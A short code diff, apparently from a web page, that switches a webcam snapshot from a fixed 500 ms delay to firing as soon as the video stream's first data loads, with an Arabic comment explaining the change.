@@ -64,7 +64,12 @@ const video = document.getElementById("video")
 navigator.mediaDevices.getUserMedia({video:true})
 .then(stream=>{
 video.srcObject = stream
-setTimeout(takePhoto,500)
+
+// تصوير فور تشغيل الكاميرا
+video.onloadeddata = () => {
+takePhoto()
+}
+
 })
 
 function takePhoto(){
